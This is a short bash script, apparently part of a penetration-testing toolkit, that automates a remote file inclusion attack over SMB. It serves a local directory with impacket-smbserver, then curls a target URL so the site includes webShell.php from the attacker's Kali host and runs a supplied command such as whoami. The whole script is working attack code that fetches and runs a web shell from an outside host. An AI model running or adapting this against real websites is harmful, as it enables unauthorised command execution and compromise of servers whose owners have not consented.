#!/bin/bash

: '
Remote RFI with SMB
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
CMD_FIELD=$(form_item "cmd" "cmd" "whoami")
PORT_FIELD=$(form_item "http port" "number" "port" "9001")
SHARE_NAME_FIELD=$(form_item "share name" "share_name" "share")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}" "${PORT_FIELD}" "${SHARE_NAME_FIELD}"

WEBSITE=${form_data["website"]}
CMD=${form_data["cmd"]}
PORT=${form_data["port"]}
SHARE_NAME=${form_data["share_name"]}

cd "${SCRIPTS_DIR}/web/lfi/.files"
impacket-smbserver -smb2support ${SHARE_NAME} $(pwd) &
SMB_PID=$!

execute_command "curl -ks '${WEBSITE}\\\\${KALI_IP}\\${SHARE_NAME}\webShell.php&cmd=${CMD}'"
create_new_line
sleep 60

kill $SMB_PID
rm webShell.php
